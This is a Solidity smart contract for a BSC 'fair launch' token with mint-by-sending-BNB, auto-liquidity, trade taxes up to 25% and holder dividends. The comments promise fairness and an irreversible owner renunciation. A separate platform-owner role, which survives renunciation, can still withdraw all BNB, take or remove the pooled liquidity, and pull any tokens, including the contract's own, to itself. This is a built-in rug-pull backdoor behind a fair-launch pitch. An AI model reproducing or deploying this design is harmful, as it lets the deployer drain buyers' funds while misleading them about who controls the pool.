// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./DividendTracker.sol";
import "./TaxDistributor.sol";

/**
 * @title ModaMintToken
 * @notice 公平发射代币合约 — 一键部署到 BSC 链
 *
 * 核心功能：
 *   - Fair Launch Mint：发送 BNB 到合约 → 自动获得代币 + 加流动性
 *   - 满额后自动开启交易
 *   - 可配置买卖税（最高 25%）
 *   - 税收四项独立分配：营销 / 销毁 / 分红 / 回流底池
 *   - 白名单模式
 *   - 持币分红（自动部署 DividendTracker）
 *   - 税费分配合约（TaxDistributor）
 *   - Owner 弃权（不可逆）
 */
contract ModaMintToken {
    // ═══════════ Events ═══════════
    event Mint(address indexed buyer, uint256 bnbAmount, uint256 tokenAmount);
    event TradingEnabled();
    event TaxDistributorSet(address indexed distributor);
    event OwnershipRenounced();
    event WhitelistUpdated(address[] addrs, bool added);
    event WhitelistModeUpdated(bool enabled);
    event WhitelistMintedReset(address[] addrs);
    event Withdrawn(address indexed to, uint256 bnbAmount);

    // ═══════════ Custom Errors ═══════════
    error TaxTooHigh();              // 0xaf1ee134
    error InvalidPresaleParams();    // 0xeb1967ad
    error MintPriceMustBePositive(); // 0xe528e11e
    error PresalePctOutOfRange();    // 0x94a0c025
    error LpPctTooHigh();            // 0xbc1c5436
    error BpsSumInvalid();           // 0xc2c2130c
    error TokensPerMintZero();       // 0x26e57fd5 (calc issue)
    error MintYieldsZeroTokens();    // 0x5c5bdd31
    error SetMintPriceZeroTokens();  // 0x05bc57a9

    // ═══════════ ERC20 State ═══════════
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    // ═══════════ Ownership ═══════════
    address public owner;
    address public platformOwner; // 平台方钱包（可接收 BNB，不受 owner 弃权影响）

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    modifier onlyPlatformOwner() {
        require(msg.sender == platformOwner, "Not platform owner");
        _;
    }

    // ═══════════ Mint Config ═══════════
    uint256 public mintPrice;        // 单次 Mint 价格（BNB wei）
    uint256 public hardCap;          // 硬顶（BNB wei）
    uint256 public totalMinted;      // 已收到 BNB 总额
    uint256 public tokensPerMint;    // 每次 Mint 获得的代币数量
    uint256 public lpTokensPerMint;  // 每次 Mint 额外加 LP 的代币数量
    uint256 public presaleTokenPct;  // 预售占比（1-99）
    uint256 public lpTokenPct;       // LP 比例（0-100）

    // ═══════════ Tax ═══════════
    uint256 public buyTax;           // bps
    uint256 public sellTax;          // bps
    uint256 public constant MAX_TAX = 2500; // 25%

    // Tax allocation (bps)
    uint256 public marketingPct;
    uint256 public burnPct;
    uint256 public dividendPct;
    uint256 public liquidityPct;

    address public marketingWallet;
    address public taxDistributor;

    // ═══════════ Trading ═══════════
    bool public tradingActive;
    bool public inSwap;
    address public uniswapV2Pair;
    address public constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address public constant FACTORY = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
    address public constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address public constant DEAD = 0x000000000000000000000000000000000000dEaD;

    // ═══════════ Whitelist ═══════════
    bool public whitelistMintOnly;
    mapping(address => bool) public whitelist;
    mapping(address => bool) public hasMinted;

    // ═══════════ Dividend ═══════════
    address payable public dividendTracker;
    uint256 public minHoldForDividend;

    // ═══════════ Tax exemptions ═══════════
    mapping(address => bool) public isTaxExempt;

    // ═══════════ Constructor ═══════════
    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_,           // 代币个数（非 wei，合约自动 × 10^18）
        uint256 mintCostBNB_,           // wei
        uint256 fillBNB_,               // wei (hard cap)
        uint256 buyTax_,                // bps
        uint256 sellTax_,               // bps
        uint256 marketingPct_,          // bps
        uint256 burnPct_,               // bps
        uint256 dividendPct_,           // bps
        uint256 liquidityPct_,          // bps
        address marketingWallet_,
        uint256 minHoldForDividend_,    // wei
        uint256 presaleTokenPct_,       // percentage 1-99
        bool whitelistMintOnly_,
        uint256 lpTokenPct_             // percentage 0-100
    ) {
        // ── 基础校验 ──
        require(bytes(name_).length > 0, "Empty name");
        require(bytes(symbol_).length > 0, "Empty symbol");
        if (mintCostBNB_ == 0) revert MintPriceMustBePositive();
        require(fillBNB_ > 0, "Zero hardCap");
        require(mintCostBNB_ <= fillBNB_, "mintCost > hardCap");
        if (presaleTokenPct_ < 1 || presaleTokenPct_ > 99) revert PresalePctOutOfRange();
        if (lpTokenPct_ > 100) revert LpPctTooHigh();
        if (buyTax_ > MAX_TAX || sellTax_ > MAX_TAX) revert TaxTooHigh();
        if (marketingPct_ + burnPct_ + dividendPct_ + liquidityPct_ > 10000) revert BpsSumInvalid();
        require(totalSupply_ > 0, "Zero supply");

        // ── 存储基本信息 ──
        name = name_;
        symbol = symbol_;
        owner = msg.sender;
        platformOwner = msg.sender;

        // ── 计算代币总供应量 ──
        uint256 totalWei = totalSupply_ * 10**18;
        totalSupply = totalWei;
        balanceOf[address(this)] = totalWei;
        emit Transfer(address(0), address(this), totalWei);

        // ── 存储 Mint 参数 ──
        mintPrice = mintCostBNB_;
        hardCap = fillBNB_;
        presaleTokenPct = presaleTokenPct_;
        lpTokenPct = lpTokenPct_;

        // ── 计算 tokensPerMint ──
        uint256 totalMints = fillBNB_ / mintCostBNB_;
        uint256 presaleTokens = totalWei * presaleTokenPct_ / 100;
        uint256 _tokensPerMint = presaleTokens / totalMints;
        if (_tokensPerMint == 0) revert TokensPerMintZero();
        tokensPerMint = _tokensPerMint;
        lpTokensPerMint = _tokensPerMint * lpTokenPct_ / 100;

        // ── 税收 ──
        buyTax = buyTax_;
        sellTax = sellTax_;
        marketingPct = marketingPct_;
        burnPct = burnPct_;
        dividendPct = dividendPct_;
        liquidityPct = liquidityPct_;
        marketingWallet = marketingWallet_ != address(0) ? marketingWallet_ : msg.sender;

        // ── 白名单 ──
        whitelistMintOnly = whitelistMintOnly_;

        // ── 分红 ──
        minHoldForDividend = minHoldForDividend_;

        // ── 部署 DividendTracker ──
        DividendTracker _tracker = new DividendTracker(address(this), msg.sender, minHoldForDividend_);
        dividendTracker = payable(address(_tracker));

        // ── 税收豁免 ──
        isTaxExempt[address(this)] = true;
        isTaxExempt[msg.sender] = true;
        isTaxExempt[dividendTracker] = true;
        isTaxExempt[DEAD] = true;
    }

    // ═══════════ Mint (receive) ═══════════

    /**
     * @notice 用户发送 BNB 到此合约 → 自动 Mint 代币 + 加流动性
     *         必须发送精确的 mintPrice BNB
     */
    receive() external payable {
        _mint();
    }

    fallback() external payable {
        _mint();
    }

    function _mint() internal {
        require(msg.value == mintPrice, "Exact mintPrice required");
        require(!tradingActive, "Trading active, mint ended");
        require(totalMinted + msg.value <= hardCap, "Hard cap reached");

        if (whitelistMintOnly) {
            require(whitelist[msg.sender], "Not in whitelist");
            require(!hasMinted[msg.sender], "Already minted");
            hasMinted[msg.sender] = true;
        }

        uint256 tokenAmount = tokensPerMint;
        if (tokenAmount == 0) revert MintYieldsZeroTokens();

        // ── 确保合约有足够代币 ──
        uint256 lpAmount = lpTokensPerMint;
        uint256 totalNeeded = tokenAmount + lpAmount;
        require(balanceOf[address(this)] >= totalNeeded, "Insufficient contract balance");

        // ── 转移代币给用户 ──
        balanceOf[address(this)] -= tokenAmount;
        balanceOf[msg.sender] += tokenAmount;
        emit Transfer(address(this), msg.sender, tokenAmount);

        // ── 更新 Mint 统计 ──
        totalMinted += msg.value;

        // ── 加流动性 ──
        if (lpAmount > 0 && msg.value > 0) {
            _addLiquidity(lpAmount, msg.value);
        }

        // ── 更新分红追踪 ──
        if (dividendTracker != address(0)) {
            try DividendTracker(payable(dividendTracker)).updateHolder(msg.sender, balanceOf[msg.sender]) {} catch {}
            if (lpAmount > 0) {
                try DividendTracker(payable(dividendTracker)).updateHolder(address(this), balanceOf[address(this)]) {} catch {}
            }
        }

        // ── 达到硬顶自动开启交易 ──
        if (totalMinted >= hardCap && !tradingActive) {
            _enableTrading();
        }

        emit Mint(msg.sender, msg.value, tokenAmount);
    }

    /* ═══════════ ERC20 ═══════════ */

    function approve(address spender, uint256 value) external returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transfer(address to, uint256 value) external returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) external returns (bool) {
        require(allowance[from][msg.sender] >= value, "Insufficient allowance");
        allowance[from][msg.sender] -= value;
        _transfer(from, to, value);
        return true;
    }

    function _transfer(address from, address to, uint256 value) internal {
        require(from != address(0), "Zero from");
        require(to != address(0), "Zero to");
        require(value > 0, "Zero value");
        require(balanceOf[from] >= value, "Insufficient balance");

        bool isTaxable = !isTaxExempt[from] && !isTaxExempt[to];

        if (isTaxable && (from == uniswapV2Pair || to == uniswapV2Pair) && !inSwap) {
            uint256 taxAmount = 0;

            if (from == uniswapV2Pair && to != uniswapV2Pair) {
                // Buy: from pair → user
                if (buyTax > 0) {
                    taxAmount = value * buyTax / 10000;
                }
            } else if (to == uniswapV2Pair) {
                // Sell: user → pair
                if (sellTax > 0) {
                    taxAmount = value * sellTax / 10000;
                }
            }

            if (taxAmount > 0) {
                uint256 transferAmount = value - taxAmount;

                balanceOf[from] -= value;
                balanceOf[to] += transferAmount;
                emit Transfer(from, to, transferAmount);

                // 税收代币转到合约
                balanceOf[address(this)] += taxAmount;
                emit Transfer(from, address(this), taxAmount);

                // 尝试转发到 TaxDistributor
                if (taxDistributor != address(0)) {
                    _forwardTaxToDistributor(taxAmount);
                }
            } else {
                balanceOf[from] -= value;
                balanceOf[to] += value;
                emit Transfer(from, to, value);
            }
        } else {
            balanceOf[from] -= value;
            balanceOf[to] += value;
            emit Transfer(from, to, value);
        }

        // ── 更新分红追踪 ──
        if (dividendTracker != address(0)) {
            try DividendTracker(payable(dividendTracker)).updateHolder(from, balanceOf[from]) {} catch {}
            try DividendTracker(payable(dividendTracker)).updateHolder(to, balanceOf[to]) {} catch {}
        }
    }

    /* ═══════════ Liquidity ═══════════ */

    function _addLiquidity(uint256 tokenAmount, uint256 bnbAmount) internal {
        if (uniswapV2Pair == address(0)) {
            // 首次：创建 pair
            uniswapV2Pair = IPancakeFactory(FACTORY).createPair(address(this), WBNB);
            isTaxExempt[uniswapV2Pair] = true;
        }

        _approveToken(ROUTER, tokenAmount);

        IPancakeRouter(ROUTER).addLiquidityETH{value: bnbAmount}(
            address(this),
            tokenAmount,
            0, // slippage
            0, // slippage
            address(this),
            block.timestamp + 300
        );
    }

    function _approveToken(address spender, uint256 amount) internal {
        allowance[address(this)][spender] = amount;
        emit Approval(address(this), spender, amount);
    }

    /* ═══════════ Tax Distribution ═══════════ */

    function _forwardTaxToDistributor(uint256 amount) internal {
        inSwap = true;
        // 先计算 burn 部分 → 直接销毁
        uint256 burnAmount = 0;
        if (burnPct > 0) {
            uint256 totalTaxAlloc = marketingPct + burnPct + dividendPct + liquidityPct;
            if (totalTaxAlloc > 0) {
                burnAmount = amount * burnPct / totalTaxAlloc;
                if (burnAmount > 0) {
                    balanceOf[address(this)] -= burnAmount;
                    balanceOf[DEAD] += burnAmount;
                    emit Transfer(address(this), DEAD, burnAmount);
                }
            }
        }

        // 剩余转发到 TaxDistributor
        uint256 forwardAmount = amount - burnAmount;
        if (forwardAmount > 0 && taxDistributor != address(0)) {
            balanceOf[address(this)] -= forwardAmount;
            balanceOf[taxDistributor] += forwardAmount;
            emit Transfer(address(this), taxDistributor, forwardAmount);

            // 尝试触发处理（仅限 autoProcess）
            try TaxDistributor(payable(taxDistributor)).tryProcess() {} catch {}
        }
        inSwap = false;
    }

    /**
     * @notice 设置税费分配合约地址
     */
    function setTaxDistributor(address _distributor) external onlyOwner {
        require(_distributor != address(0), "Zero address");
        taxDistributor = _distributor;
        isTaxExempt[_distributor] = true;
        emit TaxDistributorSet(_distributor);
    }

    /* ═══════════ Trading ═══════════ */

    function _enableTrading() internal {
        tradingActive = true;
        emit TradingEnabled();
    }

    function enableTrading() external onlyPlatformOwner {
        require(!tradingActive, "Already active");
        _enableTrading();
    }

    function tradingEnabled() external view returns (bool) {
        return tradingActive;
    }

    /* ═══════════ Whitelist ═══════════ */

    function addWhitelist(address[] calldata addrs) external onlyOwner {
        for (uint256 i = 0; i < addrs.length; i++) {
            whitelist[addrs[i]] = true;
        }
        emit WhitelistUpdated(addrs, true);
    }

    function removeWhitelist(address[] calldata addrs) external onlyOwner {
        for (uint256 i = 0; i < addrs.length; i++) {
            whitelist[addrs[i]] = false;
        }
        emit WhitelistUpdated(addrs, false);
    }

    function setWhitelistMintOnly(bool _enabled) external onlyOwner {
        whitelistMintOnly = _enabled;
        emit WhitelistModeUpdated(_enabled);
    }

    function resetWhitelistMinted(address[] calldata addrs) external onlyOwner {
        for (uint256 i = 0; i < addrs.length; i++) {
            hasMinted[addrs[i]] = false;
        }
        emit WhitelistMintedReset(addrs);
    }

    function whitelistOnly() external view returns (bool) {
        return whitelistMintOnly;
    }

    /* ═══════════ Admin ═══════════ */

    function withdrawBNB() external onlyPlatformOwner {
        uint256 bal = address(this).balance;
        require(bal > 0, "No BNB");
        (bool success, ) = payable(platformOwner).call{value: bal}("");
        require(success, "Transfer failed");
        emit Withdrawn(platformOwner, bal);
    }

    function withdrawLP(uint256 amount) external onlyPlatformOwner {
        require(uniswapV2Pair != address(0), "No pair");
        IERC20(uniswapV2Pair).transfer(platformOwner, amount);
    }

    function removeLiquidity(uint256 lpAmount) external onlyPlatformOwner {
        require(uniswapV2Pair != address(0), "No pair");
        IERC20(uniswapV2Pair).approve(ROUTER, lpAmount);

        IPancakeRouter(ROUTER).removeLiquidityETH(
            address(this),
            lpAmount,
            0, 0,
            platformOwner,
            block.timestamp + 300
        );
    }

    function emergencyWithdrawToken(address _token, uint256 amount) external onlyPlatformOwner {
        IERC20(_token).transfer(platformOwner, amount);
    }

    /**
     * @notice 手动触发分红 swap
     */
    function swapAndDistributeDividend() external {
        if (taxDistributor != address(0)) {
            TaxDistributor(payable(taxDistributor)).tryProcess();
        }
    }

    /**
     * @notice 丢弃 Owner 权限（不可逆）
     */
    function renounceOwnership() external onlyOwner {
        owner = address(0);
        emit OwnershipRenounced();
    }

    /* ═══════════ View Helpers ═══════════ */

    /**
     * @notice 每次 Mint 的固定 BNB 数量（兼容 mint.html 的 mintBatchSize 查询）
     */
    function mintBatchSize() external view returns (uint256) {
        return mintPrice;
    }
}
